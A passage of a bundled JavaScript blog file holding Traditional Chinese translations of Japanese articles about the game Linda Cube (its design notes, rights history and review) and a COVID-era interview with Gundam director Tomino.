的約定俗成皆不通用。</h3>\n<p>主角並不是勇者。也沒有要打倒的邪惡魔王。也絕對無法拯救世界。\n刻意脫離王道，變成了充滿奇幻和混亂的劇情正是最大的特徵。\n主角所拯救的並不是世界和國家，而是奇形怪狀的動物與青梅竹馬的女孩。\n在桝田的個人網站裡還特地對這點做了註記。\n「我先說了!! 這款遊戲裡沒有魔王。你也不是勇者。沒有什麼魔法。不會有人告訴你該去哪裡。不管你怎麼做都無法阻止隕石。」</p>\n<h3 id=\"◎8-年後隕石絕對會墜落下來。\">◎8 年後隕石絕對會墜落下來。</h3>\n<p>遊戲裡除了一部份的地點之外時間會一直流逝（半即時制）。只要在遊戲內的時間內過了 8 年，「死神」就會無情地向新肯亞落下。另外隨著時間的經過，小鎮的住民們也會脫離新肯亞，設施也會變得無法使用。在 PS/SS 版裡甚至會使得貴重的動物滅絕。</p>\n<h3 id=\"◎-捕捉動物是最重要的事情！\">◎ 捕捉動物是最重要的事情！</h3>\n<p>如同前面所提到的，為了完成方舟計畫，需要去採取棲息在新肯亞的動物的基因資料。\n而捕獲動物也有許多種方式。除了狩獵直接活捉外，還能設置陷阱、和動物商購買，或是委託獵人等等。\n而捉到的動物的用途也並不是只有帶進方舟而已。帶進方舟的動物只需要一對，也就是雌雄各一隻就可以了。\n剩下的動物能夠用來加工成食品或是裝備，或是以高價出賣動物。在 PS/SS 版還能訓練其成為獵犬。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://i.imgur.com/oSD112X.jpg\"><img src=\"https://i.imgur.com/oSD112X.jpg\" alt=\"img\"></a></p>\n<p>△ 飯店的櫃台人員也會因為伙伴變化而有不同的發言</p>\n<h2 id=\"◎-很色情\">◎ 很色情</h2>\n<p>由於原本就是對於「王道劇本」產生的鬱憤所製作的劇本，因此有許多似乎是為了挑戰 PCE 的倫理規定的性方面的梗。像是琳達在隊中的狀態野營後道具裡的「面紙」會被消費（似乎是因為肯擤了鼻涕？）。其他還有，像是在劇本 C 的野營裡的話題之一是「第一個生下來的孩子的名子要取什麼」。琳達會說「想快點和（琳達和肯第一個孩子）見面了…來做吧！！」</p>\n<p>但實際上這些場景完全沒有（以畫面的形式）明確呈現。但以「在方舟裡兩人獨處」「是以一對男女所搭乘的」等等考量，方舟計畫結束之後必然會如此發展吧。</p>\n<p>其他也有不少「愛的巢穴」、「老博士在美麗的未亡人的桌子底下蠕動著」、「將臉塞進親生的女兒的跨下說出『這就是女兒的香味』的大叔」等等危險的內容。</p>\n<p>就普通人來看，可能會對於整款遊戲所散發的這種帶有性的世界感到困惑。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://i.imgur.com/WpYoQAk.png\"><img src=\"https://i.imgur.com/WpYoQAk.png\" alt=\"img\"></a></p>\n<p>△ 和河馬的戰鬥，PS 版重製後的動物圖像依然不失其特色</p>\n<h2 id=\"◎-鬱憤？\">◎ 鬱憤？</h2>\n<p>這款遊戲的根底是「對於王道的反命題」。</p>\n<p>負責腳本的桝田省治之前所負責「天外魔境 2」的腳本，伴隨著這過於濃厚的王道劇本的 3 年製作時間。在這 3 年之中所囤積的鬱悶「使得我身為創作者的血開始沸騰」，而讓這股鬱悶以有趣而怪異的姿態所昇華的變是本作。</p>\n<p>而在 C 劇本裡便能發現這份驚人的精神，就連桝田本人的介紹頁面都說到 A/B 劇情只是「由於遊戲系統的部份太難以掌握了，因此做為新手用的附錄而加進去了」。</p>\n<p>另外也因為這股鬱悶的反彈，有著非常濃烈的內部設定。尤其是 PCE 版的 Linda Cube 的預約特典「琳達的秘密」裡更是詳盡地記載了角色們的設定，對於愛好者們來說可說是非常貴重的存在。</p>\n<h2 id=\"◎-雜談\">◎ 雜談</h2>\n<p>現在「Again」雖然收錄在 Game Archives 裡，但這其中的經過非常的複雜。</p>\n<p>在 2007 年 9 月 27 日進行了首次的收錄，但由於權利相關問題在過了數小時後便被中止。</p>\n<p>幾經波折後終於在約 1 年後的 2008 年 9 月 10 日成功再次收錄。</p>\n<p>對於這中間幾經波折的部份有興趣的人請一定要去看看 Alpha System Mars 的部落格「<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.alfasystem.net/a_m/diary.cgi?date=20080911\">Linda Cube Again 收錄開始</a>」。</p>\n<p>對於 Archive 收錄有興趣的人而言，是段相當不錯的故事。</p>\n","date":"2019-10-29T06:00:00.000Z","excerpt":"","printDate":"October 29, 2019","printReadingTime":"1 min read"};

var route_33 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod18
});

var Mod19 = {"title":"【譯】Linda Cube Again 正式上架","slug":"ACG-linda-cube-on-ps-archive","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.alfasystem.net/a_m/diary.cgi?date=20080911\">http://www.alfasystem.net/a_m/diary.cgi?date=20080911</a></p>\n<hr>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.jp.playstation.com/software/title/jp9000npji00040_000000000000000001.html\">リンダキューブ　アゲイン | プレイステーション ® オフィシャルサイト</a></li>\n</ul>\n<p>唉呀——真的是好漫長哪。</p>\n<p>當時的我完全想像不到，釐清各處的權利關係歸屬，讓《Linda Cube Again》能夠上架數位商店，竟然會需要花上一整年的時間。</p>\n<p>現在回想起來，第一次談到《Linda Cube Again 數位版》的話題，是去年 9/26 由 SCE 所提案的點子。但仔細一看那份契約，其實是沒辦法在 PSP 遊玩的。而且即使能在 PSP 上玩，也賺不到什麼錢吧，不過若是能在 PSP 上玩到這款遊戲，玩家們應該是會很高興的。所以我決心要釐清整個權利的歸屬關係。</p>\n<p>然而，在第一個階段我就遇到挫折了。首先是最初擁有權利的 NEC Home Electronics 這間公司已經不存在了。以及桝田先生上頭的 I&amp;S 這家公司後來也換了名字，並撤掉了相關的部門。</p>\n<p>開頭就已經是踏不出腳、充滿黑暗的一步。</p>\n<p>如果僅只是為了利益，我早已經在釐清權利關係之前的這時候，就向 SCE 說道「數位版窒礙難行」並拒絕此事了吧。但桝田先生聯絡我問說「《跨越我的屍體前進》的數位版評價相當好，聽說《Linda》也要推數位版了？」、「我很好奇這個時代會如何評價《Linda》」。</p>\n<p>《Linda Cube》有個評價是，這部作品是「過早出現的寶可夢」。</p>\n<p>想著「為了玩家也是為了桝田先生，我一定要讓這件事成功」，我再次挺身向前。確認了 NEC Home Electronics 的相關權利目前在 NEC BIGLOBE 手上，以及十分幸運的，當時 I&amp;S 的相關負責人仍然還在 I&amp;S BBDO 裡上班。</p>\n<p>首先從向這兩間公司取得相關權利開始，但 I&amp;S BBDO 似乎不太想在這塊上與 NEC 進行交涉，這樣事情又會無法推動，事情經過到此已經過了 1 個月。之後 I&amp;S BBDO 表示願意將《Linda Cube》的權利移交給弊公司，希望能由我們去和 NEC 交涉，事情才有了進展。</p>\n<p>於是《Linda Cube》法理上的轉讓地位備忘錄與契約簽定，就在 I&amp;S BBDO、NEC BIGLOPE 和 Alpha System 這三間公司之間的交涉下開始推動。但這件事花費了 2 個月，直到備忘錄送到 NEC BIGLOPE 手上、簽定合約的時候，已經是聖誕節了。這也是蠻有 Linda 的風格的。</p>\n<p>年後，這次是版稅的交涉，原本的契約簽定的是「PS 版賣出 1 份會付多少錢」，但定價只有原價 1/10 的 PS Archive 會讓 Alpha System 隨著數位版的量而造成更多的赤字。雖然我們已經和 I&amp;S BBDO 拿到了權利，仍然還有支付費用的義務，這次展開了變更售價和版稅變更的交涉。</p>\n<p>這是漫長路程的起點。每次交涉都要花上 1 個月，周轉時間平均就要 1 個月。相關的信件會在已經忘記的時候才寄來。數度壓抑途中湧上「這真的能成功嗎？」的心情，一步一步地透過交涉抵達雙方都能接受的點，這次才能成功推出數位版。</p>\n<p>雖然只從數位版這件事來看的話，對桝田先生和 Alpha System 而言是毫無任何風險的，但考量到花費在上頭的勞力和交通費，究竟會需要多少份下載才足夠？不過更重要的還是，能讓多少人因此感到高興吧。以及桝田先生去年在意的，這款遊戲在這個時代會被如何評價，現在我們終於能夠知道了。</p>\n<p>桝田先生，我成功做到了。</p>\n<p>下次電玩展我上京的時候，再來喝杯酒吧。</p>\n","date":"2020-09-14T22:09:01.000Z","excerpt":"","printDate":"September 14, 2020","printReadingTime":"1 min read"};

var route_30 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod19
});

var Mod20 = {"title":"【譯】桝田省治的製作筆記 ～Making of Linda3～","slug":"ACG-making-of-linda3","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.alfasystem.net/a_m/column/sub.4.0.htm\">http://www.alfasystem.net/a_m/column/sub.4.0.htm</a></p>\n<hr>\n<p>95 /(取自 PCE 版 Linda 初回特典《Linda 的秘密》)</p>\n<iframe width=\"560\" height=\"315\" title=\"linda cube cm\" src=\"https://www.youtube.com/embed/Jc1QGIhnTaU\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n<h2 id=\"這一切是從《天外魔境-ii》開始的\">這一切是從《天外魔境 II》開始的…</h2>\n<p>在《天外魔境 II》發售約 1 個月後，家中長男出生的時候，我交上了 2 份 RPG 的企畫書。一份是《跨越我的屍體前進》，簡單講就是人類版本的《德貝賽馬》。另外一份是《天國的動物園》，也就是 Linda 的前身。</p>\n<p>這兩份企畫對我而言都是採用了以前從未試過的系統，我深信這必定能產生出全新的興奮。所以起先便決定了不論順序為何，最後都要實現這兩份企畫。反過來說其實也是在迷惘著不知道該先從哪份企畫著手。</p>\n<p>那是在《坦克戰記 2》的會議結束之後，某個下午的事情。我在荻窪的一間書店中瞄到「即將滅種的動物們」的專櫃，產生了興趣。似乎是往年都會掛著聯合國的旗子，介紹著「國際婦女節」、「兒童節」之類的東西，而那年的題目正好是「稀有動物」。這就成了決定性的因素。因為我能在這邊不費吹灰之力湊齊《天國的動物園》所需要的大部份資料。所以《跨越屍體》因此沉眠了 5 年，《德貝賽馬》在這段時間大熱賣！真讓我有點不甘心…（但是《德貝賽馬》真的相當有趣，我已經玩了半年二手買來的 2 代，害怕 3 代會再沉迷更久而決定不碰了。）</p>\n<p>所以我先開始製作了《天國動物》。但這個企畫又是如何轉變成 Linda 的？在聊這件事之前，先來講講這款遊戲想法的原點吧。</p>\n<p>那是差不多在 4 年前，在扛著《天外 II》死線的沉重壓力下進行著開發作業的時候。人越是在忙的時候越需要休息。幾位主要開發人員一同到了 JR 市ヶ谷站附近的喝啤酒吃宵夜。</p>\n<p>我已經忘記是誰先開頭的。「我不想再做這麼大規模的遊戲了！」、「我不需要讓自己的作品受到萬人愛戴。我想製作新的遊戲系統！」、「懲惡揚善什麼的吃大便去吧！」</p>\n<p>因為我們裡頭即使是資歷較淺的人，都已經花費了整整 2 年在《天外 2》上面。或許逃避心理與啤酒的力量也推了一把，我們在「下一部遊戲就是要做和《天外 2》相反路線的東西」上達成了一致意見。並且就在當場討論出了遊戲系統與核心的劇情架構。這就是《天國動物》，也就是 Linda 的原點。Linda 是在大多數《天外 2》主要成員的見證下誕生的。可說 Linda 是離《天外 2》最接近也是最遙遠的作品。</p>\n<h2 id=\"從《天國的動物園》變成《linda-cube》\">從《天國的動物園》變成《Linda Cube》</h2>\n<p>讓我替當時完成的《天國動物》的楔子作個介紹吧。</p>\n<p>「在毫無大型產業的這顆貧瘠的星球上，有個男人想要建立一個宇宙動物園，做為觀光的標地。但他只留下了動物園的土地和數個牢籠便死去了，玩家所扮演的少年要繼承他的意志。如果抓到稀有的動物，就能讓入園者增加，成為大富翁。還可以設置大型遊樂設施展示動物的戰鬥給客人們看，並且讓他們下注，也能自動物身上採取材料製作衣服，或是經營副業建設養殖場」</p>\n<p>起先的遊戲是這樣子的。只有奧茲港一個城市，沒有方舟，當然也沒有琳達。從劇本 C 去如此想像便大致符合。這和之後的遊戲系統沒有太大的差別，可以說是相當簡潔而鮮明的設計。但我深信著「動身尋寶」肯定能夠獲得巨大的成功。</p>\n<p>我把這個點子告訴了某位人稱どんちゃん，名為井澤寛的人物。他是個連我的師父さくまあきら都另眼相看的怪物。是個過去曾經產生過諸多名言「沒賣新的武器就稱不上是城鎮！」、「一次跟別人講超過三件新的事情怎麼可能記得住！」、「（天外魔境的）根之一族裡有惡神黃泉，我們（火之一族）卻沒有神明，這樣也太卑鄙了吧！」的超級除錯員（雖然也有謠言說他只是笨又任性而已）。どんちゃん這樣和我說道。</p>\n<p>「遊戲目的是經營動物園的話實在讓人燃不起來哪。毫無夢想。RPG 果然還是得要氣勢磅礡地拯救這個世界才行啊！」</p>\n<p>請他吃了一頓飯後居然還和我講了這樣的話。真的只能說不愧是どんちゃん。所以我轉向荻窪的書店裡買來的大量資料中尋找「收集動物拯救世界的故事」。很快地就找到關鍵字了，諾亞方舟。現在流行的詭異世紀末日書籍教會了我一件事，只要把裡頭的大洪水設定改成十分常見的殞石衝突就行了。也取得了どんちゃん老師的 OK。但這個階段裡還沒有琳達。</p>\n<p>「沒有美少女的 PC Engine 遊戲是沒人會買的啦」</p>\n<p>如果我沒有記錯的話，這句令人頭痛的發言是由現任的 MediaWorks 社長佐藤先生所說的。岩崎啓眞也附聲同意。佐藤還滿臉笑意地說：「有了和女孩子的互動之後，還需要能拉抬情緒的故事啊。這樣雜誌就能賣得好了」。</p>\n<p>至此美少女（琳達）和帶有故事性的遊戲劇本加進了遊戲之中。但我所構思的是能夠不受遊戲故事限制的遊戲系統。這兩者是無法相容的。所以雖然會讓作業量增加，我選擇了加入多個遊戲劇本。</p>\n<p>所以我所認為的劇本 A、B 只是劇本 C 的「附帶品」或是「練習模式」而已。而既然是附帶品，人們的資質不同會分為作出正常的東西就好，或是就此大鬧一番，當然我是屬於後者。</p>\n<p>為了不讓繪圖和編程造成負擔，這幾個劇本設定成了平行世界。而且還因為接受了那些明明不是親自下來寫劇本的人，放肆地說只有附帶 1 個劇本的話「太摳了」，便決定了要有 3 套劇本。這時候為了突顯賣點（美少女+3 套劇本）正式決定遊戲標題是《Linda 3》。並重新利用備案的「航向星之大海的方舟」成了宣傳標語，「Astro Ark」則成了副標題。</p>\n<h2 id=\"平行劇本的妙處\">平行劇本的妙處</h2>\n<p>其實附帶的劇本除了 A 和 B 之外，還有準備另外一條。A 劇本的關鍵人物是班海姆博士，B 劇本則是艾默里博士。所以能夠很容易想像到最後沒放進去的劇本關鍵人物是芙蘿拉博士。是和那朵 MC 愛莉斯有關的故事。現在想想幸好沒有採用這套劇本。如果放進去了好一點會變成沒有色情場景的 18 禁作品，糟一點就變成沒有色情場景的禁止發售作品了。雖然這樣說大家就會很想知道劇本的內容，但最後沒有採用的原因是它比劇本 A 和 B 更無聊。所以可以不用太過期待。</p>\n<p>總之，要在同個世界設定與相同的登場人物的限制底下，撰寫同樣的劇本是很麻煩的。也有同業界的人數度和我說「你分成 3 部不同的 RPG 去做不是比較輕鬆嗎」，我則應著他們的期待回答「真的超痛苦，下次不會再這樣做」。但麻煩歸麻煩，我有著強大的伙伴，也就是極為優秀的資料庫。這似乎是英國的民族學學者花了數十年整理出來的東西，簡單講裡頭將歐洲的傳說與神話故事全部依照模式分門別類。像是「體內的蛇：潛入體內的生物成長壯大而宿主死去」這樣地分成了數千種不同的項目。而我只是從這份文獻裡選出 20 個比較普遍的點子串起來而已。像是劇本 B 看似簡短，裡頭塞了十幾個這種點子，以劇本要素來說就已經是過於充份，濃厚得會令人反胃了。畢竟這可是花費了數千年，都是超過數億人覺得有趣而傳承至今的故事。如果劇本會無聊，理由也只會是我的編輯能力不足。（順帶一提，我並不打算提到這份文獻的名字與是如何取得的。它小有名氣所以稍微找一下應該就找得到了。有興趣的話就別省下這些勞力吧。）</p>\n<p>有點扯遠了。所以其實在組織這 3 條平行的劇本時，比起痛苦其實是更加開心的。也有預料之外的發現，例如在劇本 B 裡放進 C 的伏筆，或是不經意地在劇本 B 裡放進 A 中沒講明的謎題答案，用上這種技巧就能有意地創造出奇妙的現象。那就是以遊戲本身實現的既視感，以及逆其而行的致敬笑果。我認為這是在遊戲這個媒介中仍然無人挖掘出的全新樂趣。</p>\n<h2 id=\"劇本-a-的原點\">劇本 A 的原點</h2>\n<p>似乎對某一部份的人來說，我所寫出的劇本和角色，包含惡趣味在內，相當地有趣且有刺激性，我很感謝能有如此的評價。而這種話自己說是有點老王賣瓜，這個程度的東西和我的夢比起來還是微不足道的。我的點子有一半是在走路的途中或是在電車裡想到，另外一半就是從夢裡來。所以我的枕頭邊一定會放一本筆記本。劇本 A 的原型也在那本筆記裡。那是我在大約 5 年前所做的夢。</p>\n<blockquote>\n<p>＜地點是大學的時候住的老舊公寓，房屋中間有個暖桌。突然入口傳來激烈的敲門聲，拿著出刃包丁的主婦破門而入，揮舞著手上的刀刃。好不容易擊退她後，房間裡頭的窗戶玻璃傳來破碎聲，轉頭一看有個穿著學生服的男人，手持著球棒闖了進來，開始毆打我…。</p>\n<p>然後我醒了過來，我似乎是坐在暖桌裡的時候睡著了。醒來後發現弟弟在我的另一側。暖桌上四散著藍色和紅色的紙片。藍色的上面寫著主詞，紅色的上面則寫著動詞。仔細一看裡頭有兩對紙整齊地排在旁邊。一對上面寫著「歇斯底里的主婦」、「拿著出刃包丁大鬧」。另外一對寫著「受不了升學壓力的學生」、「用球棒殺了人」。這些組合一定是弟弟趁著我睡覺的時候湊出來的。他的注意力正在電視上面，這是我回擊的機會。我在紅色與藍色的紙片裡找著最過份的組合。這時察覺到的弟弟仍然看著電視如此說道。</p>\n<p>「哥哥，你這樣做也是白費的。因為…」</p>\n<p>轉頭過來，嘴角上揚。</p>\n<p>「因為，你根本沒有弟弟啊！？」</p>\n<p>我大叫從床上跳了起來，旁邊睡著一個我不認識的女人。她一臉不愉快地問我「怎麼了？」。這時我想起我只有妹妹，眼前這位女性是結婚沒多久的妻子。而剛才所看到的都是夢，似乎這才是現實。＞</p>\n</blockquote>\n<p>怎麼樣？很精妙的夢對吧？不必多說也能知道，在這個夢裡出現的，如同惡魔般的弟弟就是「尼克」的原形。</p>\n<p>但為什麼尼克會選了那種話語當成讓琳達記憶恢復的關鍵字呢。即使尼克沒有被殺，成功戰勝了肯，他也會說出「琳達，這世界上我最愛的就是你了」嗎？死無對證。答案永遠都是個謎。這種討厭的感覺就是劇本 A 的特徵。希望能讓玩家有所思考、煩惱。</p>\n<h2 id=\"劇本-b-是作者的獨秀舞台\">劇本 B 是作者的獨秀舞台</h2>\n<p>（我認為）劇本 B 可說是依照著 Twist Type（劇情不斷出現大逆轉）的教科書路線，毫無任何出錯地完成的優秀作品。（我認為）每段劇情都展現出了精湛的職人技。其中如同燻銀般閃爍的，就是卡瑪輔佐官搭乘救援太空梭的段落，因為那段處理得太過自然，導致沒人會注意到那有多厲害，所以只能我自己進行講解並炫耀。</p>\n<p>首先是卡瑪搭上太空梭前的台詞，他的台詞裡包含有「人偶師」、「我也被盯上了」、「賞金獵人來訪」和「琳達的潛伏地」這 4 個重要的資訊。</p>\n<p>想要將這些資訊傳達給玩家時，會遇到 3 個比較大的障礙。</p>\n<ul>\n<li>玩家難以一次記住 4 份資訊。</li>\n<li>卡瑪會在這之後離開，無法再次聽取情報。</li>\n<li>對話太長會令人覺得煩悶。</li>\n</ul>\n<p>就如同拙劣的 RPG 遊戲的開頭劇情所會有的問題。</p>\n<p>如何克服這 3 點難題的幾個小技巧，其中比較容易理解的，就是讓記憶力不好的卡瑪說出「好像是叫帕拉帕拉帕拉什麼的…」。其實大多時候記憶力不好的並不是卡瑪，而是玩家。所以刻意不講出正確的地名，引起玩家的興趣，並且最少要讓「帕拉」留在玩家記憶裡而不斷重複。而每段對話結束後空服員都會相當煩人地插話「還剩 3 分鐘」、「還剩 2 分鐘」、「還剩 1 分鐘」，這是對話會拉長時相當方便的手法，即使講的內容很長也能給人「只有 3 分鐘」的錯覺，倒數的緊張感也會拉抬這種效果。</p>\n<p>男大媽語彙也能把複雜的事情說得容易理解，節奏也很好，在想強化印象的特定詞彙上改變語調也不會顯得突兀。也就是說，卡瑪就是為了這段劇情才被設定成男大媽的。</p>\n<p>這段劇情大致上像這樣地其實使用了好幾個巧妙的技巧，當然對於玩家來說這些事情其實無關緊要，但也能理解為什麼我會想炫耀吧？</p>\n<p>順帶一題，從這段劇情到降落回奧茲港的途中，還再鋪了 4 個伏線。如果有空閒的話也可以再次遊玩重新確認。</p>\n<h2 id=\"第一次迷上自己作的遊戲\">第一次迷上自己作的遊戲</h2>\n<p>如同前面說的，最接近我想做的東西是劇本 C。而這大概也是 3 套劇本之中特別顯得有趣的。如同字面上「放生」玩家的目的非常明確。會讓我自賣自誇「想出這個點子的遊戲設計師，究竟是位有多麼優秀的平衡感覺的人哪！」（笑）。畢竟這也是我第一次迷上自己作的遊戲。當然「天外 II」的完成度非常高，故事中的角色也非常鮮明生動，但這些都在預料之中。想出這些的人已經知道一切，遊玩只不過是沉悶的確認作業。</p>\n<p>然而琳達的劇本 C 卻不是如此，當我發現沒有預想到的攻略方法時，開心得就像個普通人；測試玩家提出不同的攻略方法，令我不禁為之欽佩。我想裡頭肯定還沉眠著大量仍然無人嘗試過的動物捕捉法與劇情攻略法。</p>\n<p>而要說明為何這個劇本玩起來會是如此，其實極為簡單。因為原本看似分散的商店的功能、戰鬥、劇情，全部都有機的串連了起來，並且最後收束至動物身上。</p>\n<p>動物的獲得方式、利用方式就有好幾種，沒有哪種方式才是正確答案。還有把「哥梅斯抓來的動物」拿去「BB 牧場養殖」，或是將「解體動物取出的蛋」拿去「孵化」，像這種的連動技巧。做到如此卻沒有必然的確定性也可說十分有趣。從這點來說，琳達是大人的遊戲。</p>\n<p>也有個測試玩家在登錄豬之前就抽中了獎券，突然成了身擁 20 萬 G 的暴發戶。也有不斷追著螃蟹花了半年升到 20 等的人。如果是普通的 RPG，這已經大幅跳脫了原本遊戲設計師所預期的流程，遊戲平衡會變得十分糟糕。但琳達的平衡卻絲毫不會因此有所動搖。畢竟遊戲設計師自己從頭就沒有做到那麼高度的預期，也沒有跳脫的問題了。</p>\n<p>總之我很希望大家能嘗試各種不同的玩法，並且好好地享受這種隨性感。雖然要湊滿 100 種動物並不是什麼簡單的事情（有 2、3 種藏在如同詐欺般的地方），希望大家能獨力奮鬥。</p>\n","date":"2020-09-09T22:06:33.000Z","excerpt":"","printDate":"September 9, 2020","printReadingTime":"2 min read"};

var route_43 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod20
});

var Mod21 = {"title":"【譯】《鋼彈》的富野導演，給疫情下的孩子們的過激訊息","slug":"ACG-message-to-children-under-covid19-from-tomino","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://withnews.jp/article/f0201107003qq000000000000000W07c11001qq000022057A\">「ガンダム」富野監督が、コロナ禍の子どもに放つ過激なメッセージ</a></p>\n<h2 id=\"「別瞧不起大人啊！」這句話的本意是？\">「別瞧不起大人啊！」這句話的本意是？</h2>\n<p>在新型冠狀病毒襲捲地球的這數個月來，《機動戰士鋼彈》系列的生父富野由悠季（現年 79）對於變盪的世界是怎麼想的呢。趁著之前因為肺炎而中斷的「富野由悠季的世界展」於靜岡縣立美術館重新開辦，我們訪問了富野導演。有什麼想給全國休學和外出自肅的孩子們的訊息，得到的答案是「別瞧不起大人啊！」。這究竟是什麼意思呢？但聽到了最後，似乎能夠理解大師想講的意思。</p>\n<h2 id=\"「不能隨波逐流於世界情勢」\">「不能隨波逐流於世界情勢」</h2>\n<p>在新型冠狀病毒流行的這幾個月，我一直龜縮在自家和工作室中。當我為了構思下部作品閱讀著古代史相關的書籍時，動畫業界受到了大幅影響，原本預定於六處會場展出的「富野由悠季的世界展」其中兩次展出也延期了。</p>\n<p>不過「Stay Home」原本就是我的日常生活。在家撰寫文章時，就有整整 3 個月都不會外出。忙於動畫的工作時出門也只會去工作室。</p>\n<p>因為我和一般人的工作形式不同，也不會和工作室的其他員工們每晚開心地喝到天亮。殺青派對也只有半年到數年會有一次。至今過的都是和外部缺乏接觸的人生，生活並沒有太大的變化。</p>\n<p>我也很討厭生病，害怕冠狀病毒。最近到家後也會把在外面收到的零錢消毒。但我也會覺得，真的有需要做到這種程度的經濟限制嗎。</p>\n<p>有人說過「（疫情過後）人與人的距離感出現了大幅變化」，但就是因為我們有共同團體才會造成傳染病。明明至今都在說著「人是沒辦法獨自活下去的」，現在卻改口說道「不要與他人接觸」，這就像是在否定社會地讓我有種怪異感。</p>\n<p>「戴上口罩」、「拉開距離」這些呼籲真的是為了防疫嗎。在我看來更多人只是為了逃避責任而嘴上掛著這些「我有在好好防疫」的說詞而已。</p>\n<p>沒戴口罩就會被責罵，飛機也停飛了。這些規範真的是理性的嗎。乍看之下是現實主義的考量，但實際上真是如此嗎。</p>\n<p>或許在冠狀病毒的現況下這很難理解，但我認為「不能隨波逐流於世界情勢」。同化之後就會被併吞，無法再做出獨立的發言。我們必須再努力發明未被上個世代污染的表現方式。必須至死都在尋找這種方法。</p>\n<h2 id=\"「以經濟成長為目標的人類才有問題」\">「以經濟成長為目標的人類才有問題」</h2>\n<p>在 2 月到 3 月那陣子我領悟到一件事。就是「傳染症並不是什麼特別的事」。死對以前的人而言是近在咫尺，並且是自然的法則。因為我們在自然裡與病毒和細菌一同生活著，是不可能防堵所有傳染症的。</p>\n<p>我曾經一度做了「也許世界上會有 2 億左右的人因為冠狀病毒而死。而這也沒辦法」的覺悟。雖然我沒有能夠接受家人死亡的自信，但也感受到「也只能接受了」。</p>\n<p>在《機動戰士鋼彈》開頭的先導內容「過度增長的人類移民到宇宙，建構起宇宙殖民地」，是因應 1970 年代成為社會問題的人口爆發議題。但我卻沒有任何作品是談論感染症或傳染病的。明明早在中學時代就學過 19 世紀的「西班牙流感」曾經造成數千萬人死亡，卻沒學到其會造成的世界級影響。對於自己沒能應用自己學到的事物，覺得相當的失望。</p>\n<p>人口問題如今變得更加嚴苛。在戰後的地球人口只有 20 億左右，現在地球人口已經將近 80 億人。這很明顯已經太多了。已經到了即使因為冠狀病毒有所減少也無效的臨界點。從現代的視角來看，仍然以經濟成長為目標的人類才有問題。</p>\n<p>我有三個孫子。我希望地球能讓他們活到壽命盡頭。但考量現在的人口問題，或許在 50 到 60 年後他們會非常辛苦。我不想看到那樣的未來。</p>\n<h2 id=\"「不能毫不進取就說著『沒有意義』」\">「不能毫不進取就說著『沒有意義』」</h2>\n<p>如果要給目前因為冠狀病毒而過著十分苦悶生活的孩子們一份訊息的話，那就是「別瞧不起大人」。也就是大人在說著「去學習」的時候就該去學習。不能毫不進取就說「我不懂」、「這沒有意義」。因為要有所理解之後，才能做出自己的發明。</p>\n<p>再講得更簡單點就是「去讀書」一句話。這是無法外出、無法見人的時候也能做的事。</p>\n<p>以前小學有 100 本左右給兒童看的世界文學全集，我十分後悔「應該要在小學的時候全部讀過一遍的」。我當初很喜歡《魯濱遜漂流記》，仿照寫了一本小說。《基度山恩仇記》因為很難懂就不看了。《悲慘世界》因為太沉重不是很喜歡，但我很喜歡登場人物的珂賽特這個名字。</p>\n<p>當時只挑自己喜歡的看，不喜歡的就避開，直到高中時才注意到「完全晚了」。知識是越多越好，沒有什麼「雖然我不知道但也沒差」的事情。無知就是罪過。但更重要的是，「不能夠敗給知識」。</p>\n<p>曾經有人做過「人類終有一天會封印傳染症」的發言。這就和「冠狀病毒是能夠鎮壓的」一樣，我們因為近代的科學技術得到的見解，而成了認為「什麼都能夠突破」的傲慢者。</p>\n<p>人類在發現核能後，在製作核能發電廠之前就先製作了核子彈。這是科學技術上最不幸的事，也是人類背負最大的罪過。最近則是如果中央新幹線通車，就能替東京、名古屋和大阪帶來經濟效果，這完全不可信。這是即使要挖通有地震和噴火的可能性的大地建立隧道也值得做的事嗎。</p>\n<p>效率優先於一切，是工學系的研究者們最後會選擇的「技術原理主義」。當他們吸進了名為知識的麻藥，就再也無法修正自己的軌道。人類已經沉溺於知識之中。而即使不是技術者或研究者，人類也會因為「在某個領域變得傑出」而變得傲慢。</p>\n<p>像我也是 30 年來努力相信著「人類絕對能夠革新」、「會有能與他人完全互相理解的新人類出現」而製作著鋼彈，最後感到挫折。這段時間，世界上接連出現了像川譜、普丁和習進平這種強權的政治領袖，我想人類的革新是不會來臨了。</p>\n<p>所以，為了不輸給知識，必須讀書去學習知識。</p>\n<h2 id=\"「不會有人告訴你點子。所以只能讀書」\">「不會有人告訴你點子。所以只能讀書」</h2>\n<p>雖然我說了對自己對於感染症的影響力一無所知很失望，但如果我知道了是否就會大舉放進作品中，那又不是這樣。就像核武和食糧的問題一樣，如果認真探討這些議題，內容就會太過殘酷，變成賣不出去的作品。大家無法接受就不會來看，只靠一個人的夢想是無法讓商賣成立的。</p>\n<p>我現在也還在嘗試著如何「作出精緻珍貴的作品。即使從政治或學問的角度去看，都能為之輝煌的動畫」。</p>\n<p>雖然我自稱是「動畫演出家」，但我認為這是我親自得來的成績。在我 30 歲之前「動畫演出家」這個職業連稅務署的書面作業都無法通過。職員會問道「動畫是什麼？」、「不能這樣寫啦。只要寫『演出家』就行了」，這樣的狀況持續了 10 年，現在已經能夠在職業欄上這樣寫了。我至今也在學習著如何這樣突破時代。</p>\n<p>不會有人告訴你點子。所以只能讀書。這半年來我就這樣看著書做著調查，思考下一部動畫。</p>\n<p>雖然不曉得會不會用在下一部作品裡，最近我在調查的是「邪馬台國究竟在哪裡」。由邊境的女王卑彌呼派遣的使者，處在男性社會的中國文官們是如何看待的。而這些文官所寫下的歷史文書，有多少是能夠信賴的。</p>\n<p>思考著這些東西，就會覺得「我還有能夠作的東西」。</p>\n<h2 id=\"毒舌之中的真正訊息取材過後\">毒舌之中的真正訊息——取材過後</h2>\n<p>富野是位廣為人知的「毒舌家」，對他人到自己經手過的作品都會毫不留情地批評。於 1993 年播放的《機動戰士 V 鋼彈》是 1982 